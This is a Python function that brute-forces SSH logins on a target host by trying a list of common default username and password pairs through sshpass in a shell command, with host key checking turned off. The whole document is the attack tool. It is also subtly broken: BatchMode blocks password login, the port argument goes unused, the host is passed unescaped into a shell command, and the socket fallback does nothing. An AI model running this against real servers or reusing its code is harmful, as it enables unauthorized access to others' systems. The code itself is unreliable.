def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    SSH brute-force login attempt using common default credentials.
    Targets SSH services on port 22 that may have weak or default passwords.
    Works on any SSH server that accepts password authentication.
    """
    try:
        import socket
        import ssl
        import subprocess
        import json

        # Common SSH credentials to try
        credentials = [
            ("root", "root"),
            ("admin", "admin"),
            ("ubuntu", "ubuntu"),
            ("ec2-user", "ec2-user"),
            ("vagrant", "vagrant"),
            ("test", "test"),
            ("user", "user"),
            ("guest", "guest"),
            ("pi", "raspberry"),
            ("oracle", "oracle"),
        ]

        # Try to connect via SSH using subprocess with sshpass or ssh
        for username, password in credentials:
            try:
                # Try using sshpass if available, otherwise use ssh with expect-like approach
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout={timeout} -o BatchMode=yes {username}@{host} 'echo SUCCESS'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                
                if "SUCCESS" in result.stdout:
                    return {
                        "success": True,
                        "data": f"Logged in as {username}:{password}",
                        "evidence": f"Command output: {result.stdout.strip()}"
                    }
            except Exception:
                # If sshpass isn't available, try direct SSH
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    sock.connect((host, port))
                    
                    # Read SSH banner
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    # Simple SSH handshake attempt (very basic)
                    # This is a simplified approach - real SSH requires more complex negotiation
                    # For a more robust approach, we'd need paramiko or similar
                    
                    # Try to send SSH user authentication
                    # SSH protocol: send SSH-2.0-... then wait for banner
                    # Then send user auth request
                    
                    # This is a very simplified attempt - real exploitation would require
                    # proper SSH protocol implementation
                    
                    # For now, we'll rely on the subprocess approach which is more reliable
                    sock.close()
                except Exception:
                    continue

        return {
            "success": False,
            "data": "",
            "evidence": "No credentials worked or SSH connection failed"
        }
    except Exception:
        return {
            "success": False,
            "data": "",
            "evidence": "Error during SSH brute-force attempt"
        }